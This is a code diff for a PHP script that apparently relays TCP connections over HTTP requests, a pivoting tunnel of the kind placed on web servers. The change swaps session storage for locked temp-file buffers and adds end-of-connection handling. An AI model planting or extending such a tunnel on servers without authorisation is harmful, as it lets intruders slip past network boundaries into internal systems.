@@ -7,20 +7,22 @@ ini_set("allow_url_include", true);
 @ini_set('always_populate_raw_post_data', -1);
 ini_set('max_execution_time', 0);
 
-// Session configuration
+// Session configuration - only for PHPSESSID cookie
 ini_set('session.use_only_cookies', false);
 ini_set('session.use_cookies', false);
 ini_set('session.use_trans_sid', false);
 ini_set('session.cache_limiter', null);
+
 $SAVED_PHPSESSID = '';
 if (array_key_exists('PHPSESSID', $_COOKIE)) {
-    session_id($_COOKIE['PHPSESSID']);
     $SAVED_PHPSESSID = $_COOKIE['PHPSESSID'];
 } else {
-    session_start();
-    $SAVED_PHPSESSID = session_id();
+    if (function_exists('random_bytes')) {
+        $SAVED_PHPSESSID = bin2hex(random_bytes(16));
+    } else {
+        $SAVED_PHPSESSID = md5(uniqid(mt_rand(), true));
+    }
     setcookie('PHPSESSID', $SAVED_PHPSESSID);
-    session_write_close();
 }
 
 // Disable output buffering
@@ -32,6 +34,200 @@ while (ob_get_level()) {
 
 define('BUF_SIZE', 1024 * 16);
 define('MAX_READ_SIZE', 512 * 1024);
+define('EMPTY_READ_THRESHOLD', 1000);
+define('LOCK_TIMEOUT', 5);
+
+// Storage directory - use hash-based name for security (not predictable from outside)
+$_tunnel_dir_hash = substr(md5(__FILE__ . php_uname('n')), 0, 12);
+define('TUNNEL_DIR', sys_get_temp_dir() . '/s5_' . $_tunnel_dir_hash . '/');
+unset($_tunnel_dir_hash);
+if (!is_dir(TUNNEL_DIR)) {
+    @mkdir(TUNNEL_DIR, 0700, true);
+}
+
+// ============================================================================
+// Atomic File Storage (cross-platform, PHP 5.6+)
+// ============================================================================
+
+function acquireLock($key, $timeout = LOCK_TIMEOUT) {
+    $lockFile = TUNNEL_DIR . md5($key) . '.lock';
+
+    $fp = @fopen($lockFile, 'c');
+    if (!$fp) {
+        return false;
+    }
+
+    $startTime = microtime(true);
+    while (true) {
+        if (flock($fp, LOCK_EX | LOCK_NB)) {
+            return $fp;
+        }
+
+        if (microtime(true) - $startTime > $timeout) {
+            fclose($fp);
+            return false;
+        }
+
+        usleep(5000); // 5ms
+    }
+}
+
+function releaseLock($fp) {
+    if ($fp) {
+        flock($fp, LOCK_UN);
+        fclose($fp);
+    }
+}
+
+function atomicUpdate($key, $callback, $timeout = LOCK_TIMEOUT) {
+    $dataFile = TUNNEL_DIR . md5($key) . '.dat';
+
+    $fp = acquireLock($key, $timeout);
+    if (!$fp) {
+        return false;
+    }
+
+    $success = false;
+    try {
+        $currentValue = null;
+        if (file_exists($dataFile)) {
+            $data = @file_get_contents($dataFile);
+            if ($data !== false && $data !== '') {
+                $currentValue = @unserialize($data);
+            }
+        }
+
+        $newValue = call_user_func($callback, $currentValue);
+
+        if ($newValue === null) {
+            @unlink($dataFile);
+        } else {
+            $tmpFile = $dataFile . '.' . getmypid() . '.tmp';
+            if (@file_put_contents($tmpFile, serialize($newValue), LOCK_EX) !== false) {
+                // Windows: must delete target before rename
+                if (DIRECTORY_SEPARATOR === '\\' && file_exists($dataFile)) {
+                    @unlink($dataFile);
+                }
+                @rename($tmpFile, $dataFile);
+            }
+        }
+
+        $success = true;
+    } catch (Exception $e) {
+        $success = false;
+    }
+
+    releaseLock($fp);
+    return $success;
+}
+
+function atomicGet($key) {
+    $dataFile = TUNNEL_DIR . md5($key) . '.dat';
+
+    $fp = acquireLock($key, LOCK_TIMEOUT);
+    if (!$fp) {
+        return null;
+    }
+
+    $result = null;
+    if (file_exists($dataFile)) {
+        $data = @file_get_contents($dataFile);
+        if ($data !== false && $data !== '') {
+            $result = @unserialize($data);
+        }
+    }
+
+    releaseLock($fp);
+    return $result;
+}
+
+function atomicSet($key, $value) {
+    return atomicUpdate($key, function($old) use ($value) {
+        return $value;
+    });
+}
+
+function atomicRemove($key) {
+    $dataFile = TUNNEL_DIR . md5($key) . '.dat';
+    $lockFile = TUNNEL_DIR . md5($key) . '.lock';
+
+    $fp = acquireLock($key, LOCK_TIMEOUT);
+    if (!$fp) {
+        return false;
+    }
+
+    @unlink($dataFile);
+    releaseLock($fp);
+    @unlink($lockFile);
+
+    return true;
+}
+
+function atomicAppendBuffer($key, $appendData) {
+    return atomicUpdate($key, function($current) use ($appendData) {
+        if ($current === null) {
+            $current = '';
+        }
+        return $current . $appendData;
+    });
+}
+
+function atomicDrainBuffer($key, $maxSize = 0) {
+    $result = '';
+
+    atomicUpdate($key, function($current) use (&$result, $maxSize) {
+        if ($current === null || $current === '') {
+            return $current;
+        }
+
+        if ($maxSize > 0 && strlen($current) > $maxSize) {
+            $result = substr($current, 0, $maxSize);
+            return substr($current, $maxSize);
+        } else {
+            $result = $current;
+            return '';
+        }
+    });
+
+    return $result;
+}
+
+function cleanupTunnelFiles($maxAge = 3600) {
+    $markerFile = TUNNEL_DIR . '.last_cleanup';
+
+    if (file_exists($markerFile) && filemtime($markerFile) > time() - $maxAge) {
+        return;
+    }
+
+    @touch($markerFile);
+
+    $files = @glob(TUNNEL_DIR . '*.dat');
+    if ($files) {
+        $now = time();
+        foreach ($files as $file) {
+            if (@filemtime($file) < $now - $maxAge) {
+                @unlink($file);
+                @unlink(str_replace('.dat', '.lock', $file));
+            }
+        }
+    }
+}
+
+// ============================================================================
+// Key-Value wrapper (uses atomic file storage)
+// ============================================================================
+
+function getKey($key) {
+    return atomicGet($key);
+}
+
+function putKey($key, $value) {
+    return atomicSet($key, $value);
+}
+
+function removeKey($key) {
+    return atomicRemove($key);
+}
 
 // ============================================================================
 // Base64 URL-safe encoding/decoding
@@ -259,27 +455,6 @@ function writeAndFlush($data, $dirtySize = 0) {
     if (function_exists('ob_flush')) {
         @ob_flush();
     }
-}
-
-function getKey($key) {
-    @session_start();
-    $value = isset($_SESSION[$key]) ? $_SESSION[$key] : null;
-    session_write_close();
-    return $value;
-}
-
-function putKey($key, $value) {
-    @session_start();
-    $_SESSION[$key] = $value;
-    session_write_close();
-}
-
-function removeKey($key) {
-    @session_start();
-    if (isset($_SESSION[$key])) {
-        unset($_SESSION[$key]);
-    }
-    session_write_close();
 }
 
 function processTemplateStart($sid) {
@@ -573,7 +748,7 @@ function performHalfCreate($dataMap, $tunId, $dirtySize) {
                 $consecutiveEmptyReads = 0;
             } else {
                 $consecutiveEmptyReads++;
-                if ($consecutiveEmptyReads > 100) {
+                if ($consecutiveEmptyReads > EMPTY_READ_THRESHOLD) {
                     break;
                 }
             }
@@ -726,36 +901,36 @@ function classicBackgroundWorker($socket, $tunId) {
                 break;
             }
             if (strlen($data) > 0) {
-                $key = $tunId . '_read_buf';
-                $existingBuf = getKey($key);
-                if ($existingBuf === null) {
-                    $existingBuf = '';
-                }
-                putKey($key, $existingBuf . $data);
+                // Atomic append to read buffer
+                atomicAppendBuffer($tunId . '_read_buf', $data);
 
                 $lastActivityTime = time();
                 $consecutiveEmptyReads = 0;
             } else {
                 $consecutiveEmptyReads++;
-                if ($consecutiveEmptyReads > 100) {
+                if ($consecutiveEmptyReads > EMPTY_READ_THRESHOLD) {
                     break;
                 }
             }
         }
 
-        $writeBuf = getKey($tunId . '_write_buf');
+        // Atomic drain write buffer
+        $writeBuf = atomicDrainBuffer($tunId . '_write_buf');
         if ($writeBuf && strlen($writeBuf) > 0) {
-            $expectedLen = strlen($writeBuf);
-            putKey($tunId . '_write_buf', '');
             $written = @fwrite($socket, $writeBuf);
 
             if ($written === false) {
                 break;
             }
-            if ($written < $expectedLen) {
+            if ($written < strlen($writeBuf)) {
+                // Put unwritten data back (prepend)
                 $unwritten = substr($writeBuf, $written);
-                $existingBuf = getKey($tunId . '_write_buf');
-                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
+                atomicUpdate($tunId . '_write_buf', function($current) use ($unwritten) {
+                    if ($current === null) {
+                        $current = '';
+                    }
+                    return $unwritten . $current;
+                });
             }
             $lastActivityTime = time();
         }
@@ -765,10 +940,12 @@ function classicBackgroundWorker($socket, $tunId) {
             break;
         }
     }
+
     @fclose($socket);
-    removeKey($tunId . '_ok');
-    removeKey($tunId . '_read_buf');
-    removeKey($tunId . '_write_buf');
+
+    // Set EOF flag to notify client that connection is closed
+    putKey($tunId . '_eof', true);
+    putKey($tunId . '_ok', false);
 }
 
 function performWrite($dataMap, $tunId) {
@@ -778,46 +955,55 @@ function performWrite($dataMap, $tunId) {
         return;
     }
 
-    // Append to write buffer using session
-    $key = $tunId . '_write_buf';
-    $existingBuf = getKey($key);
-    if ($existingBuf === null) {
-        $existingBuf = '';
+    // Check if tunnel still exists
+    $okStatus = getKey($tunId . '_ok');
+    if ($okStatus === false || $okStatus === null) {
+        return;
     }
-    putKey($key, $existingBuf . $data);
+
+    // Atomic append to write buffer
+    atomicAppendBuffer($tunId . '_write_buf', $data);
 }
 
 function performRead($tunId) {
-    $key = $tunId . '_read_buf';
-    $readBuf = getKey($key);
+    // Atomic drain read buffer (with max size limit)
+    $dataToSend = atomicDrainBuffer($tunId . '_read_buf', MAX_READ_SIZE);
 
-    if ($readBuf === null || $readBuf === '') {
-        return '';
+    // Check if there's data to send
+    if ($dataToSend !== null && $dataToSend !== '') {
+        return marshalBase64(newData($tunId, $dataToSend));
     }
 
-    $dataToSend = '';
-
-    if (strlen($readBuf) > MAX_READ_SIZE) {
-        $dataToSend = substr($readBuf, 0, MAX_READ_SIZE);
-        $remaining = substr($readBuf, MAX_READ_SIZE);
-        putKey($key, $remaining);
-    } else {
-        $dataToSend = $readBuf;
-        putKey($key, '');
+    // No data in buffer, check if connection is closed (EOF)
+    $eofStatus = getKey($tunId . '_eof');
+    if ($eofStatus === true) {
+        // Connection closed by remote, clean up and notify client
+        removeKey($tunId . '_ok');
+        removeKey($tunId . '_read_buf');
+        removeKey($tunId . '_write_buf');
+        removeKey($tunId . '_eof');
+        return marshalBase64(newDel($tunId));
     }
 
-    $response = '';
-    if (strlen($dataToSend) > 0) {
-        $response .= marshalBase64(newData($tunId, $dataToSend));
+    // Check if tunnel still exists and is active
+    $okStatus = getKey($tunId . '_ok');
+    if ($okStatus === null || $okStatus === false) {
+        // Tunnel doesn't exist or was closed, send DEL
+        removeKey($tunId . '_ok');
+        removeKey($tunId . '_read_buf');
+        removeKey($tunId . '_write_buf');
+        removeKey($tunId . '_eof');
+        return marshalBase64(newDel($tunId));
     }
 
-    return $response;
+    return '';
 }
 
 function performDelete($tunId) {
     putKey($tunId . '_ok', false);
     removeKey($tunId . '_read_buf');
     removeKey($tunId . '_write_buf');
+    removeKey($tunId . '_eof');
 }
 
 // ============================================================================
@@ -825,6 +1011,9 @@ function performDelete($tunId) {
 // ============================================================================
 
 function process() {
+    // Cleanup old tunnel files periodically
+    cleanupTunnelFiles();
+
     $requestBody = file_get_contents('php://input');
     if (!$requestBody) {
         return;
@@ -937,6 +1126,7 @@ function process() {
                         @ob_flush();
                     }
 
+                    // Must finish request before starting background worker
                     ignore_user_abort(true);
                     if ($needWorker && $workerSocket) {
                         if (function_exists('fastcgi_finish_request')) {
